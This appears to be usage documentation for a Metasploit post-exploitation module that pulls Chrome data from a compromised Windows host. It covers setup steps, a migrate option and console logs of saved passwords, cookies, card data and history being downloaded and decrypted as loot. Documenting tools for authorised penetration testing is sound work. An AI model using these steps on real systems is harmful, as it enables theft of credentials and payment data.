## Vulnerable Application

  This post-exploitation module will extract saved user data from Google Chrome and attempt to decrypt sensitive information.
  Chrome encrypts sensitive data (passwords and credit card information) which can only be decrypted with the **same** logon credentials. This module tries to decrypt the sensitive data as the current user unless told otherwise via the MIGRATE setting.

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session
  3. Do: `use post/windows/gather/enum_chrome`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. You should be able to see the extracted chrome browser data in the loot files in JSON format

## Options

  - **MIGRATE** - Migrate automatically to explorer.exe. This is useful if you're having SYSTEM privileges, because the process on the target system running meterpreter needs to be owned by the user the data belongs to. If activated the migration is done using the metasploit `post/windows/manage/migrate` module. The default value is false.

  - **SESSION** - The session to run the module on.

## Extracted data

  - Web data:
    - General autofill data
    - Chrome users
    - Credit card data
  - Cookies
  - History
    - URL history
    - Download history
    - Search term history
  - Login data (username/password)
  - Bookmarks
  - Preferences

## Scenarios

  **Meterpreter session as normal user**

  ```
  [*] Meterpreter session 1 opened (192.168.2.117:4444 -> 192.168.2.104:51129) at 2016-10-13 20:45:50 +0200

  msf exploit(handler) > use post/windows/gather/enum_chrome
  msf post(enum_chrome) > set SESSION 1
  SESSION => 1
  msf post(enum_chrome) > run

  [*] Impersonating token: 3156
  [*] Running as user 'user-PC\user'...
  [*] Extracting data for user 'user'...
  [*] Downloaded Web Data to '/home/user/.msf4/loot/20161013205236_default_192.168.1.18_chrome.raw.WebD_032796.txt'
  [*] Downloaded Cookies to '/home/user/.msf4/loot/20161013205238_default_192.168.1.18_chrome.raw.Cooki_749912.txt'
  [*] Downloaded History to '/home/user/.msf4/loot/20161013205244_default_192.168.1.18_chrome.raw.Histo_307144.txt'
  [*] Downloaded Login Data to '/home/user/.msf4/loot/20161013205309_default_192.168.1.18_chrome.raw.Login_519738.txt'
  [*] Downloaded Bookmarks to '/home/user/.msf4/loot/20161013205310_default_192.168.1.18_chrome.raw.Bookm_593102.txt'
  [*] Downloaded Preferences to '/home/user/.msf4/loot/20161013205311_default_192.168.1.18_chrome.raw.Prefe_742084.txt'
  [*] Decrypted data saved in: /home/user/.msf4/loot/20161013205909_default_192.168.1.18_chrome.decrypted_173440.txt
  [*] Post module execution completed
  ```

  **Meterpreter session as system**

  In this case, you should set the MIGRATE setting to true. The module will try to migrate to explorer.exe to decrypt the encrypted data. After the decryption is done, the script will migrate back into the original process.

  ```
  [*] Meterpreter session 1 opened (192.168.2.117:4444 -> 192.168.2.104:51129) at 2016-10-13 20:45:50 +0200

  msf exploit(handler) > use post/windows/gather/enum_chrome
  msf post(enum_chrome) > set SESSION 1
  SESSION => 1
  msf post(enum_chrome) > set MIGRATE true
  MIGRATE => true
  msf post(enum_chrome) > run

  [*] current PID is 1100. migrating into explorer.exe, PID=2916...
  [*] done.
  [*] Running as user 'user-PC\user'...
  [*] Extracting data for user 'user'...
  [*] Downloaded Web Data to '/home/user/.msf4/loot/20161013205236_default_192.168.1.18_chrome.raw.WebD_032796.txt'
  [*] Downloaded Cookies to '/home/user/.msf4/loot/20161013205238_default_192.168.1.18_chrome.raw.Cooki_749912.txt'
  [*] Downloaded History to '/home/user/.msf4/loot/20161013205244_default_192.168.1.18_chrome.raw.Histo_307144.txt'
  [*] Downloaded Login Data to '/home/user/.msf4/loot/20161013205309_default_192.168.1.18_chrome.raw.Login_519738.txt'
  [*] Downloaded Bookmarks to '/home/user/.msf4/loot/20161013205310_default_192.168.1.18_chrome.raw.Bookm_593102.txt'
  [*] Downloaded Preferences to '/home/user/.msf4/loot/20161013205311_default_192.168.1.18_chrome.raw.Prefe_742084.txt'
  [*] Decrypted data saved in: /home/user/.msf4/loot/20161013205909_default_192.168.1.18_chrome.decrypted_173440.txt
  [*] migrating back into PID=1100...
  [*] done.
  [*] Post module execution completed
  ```
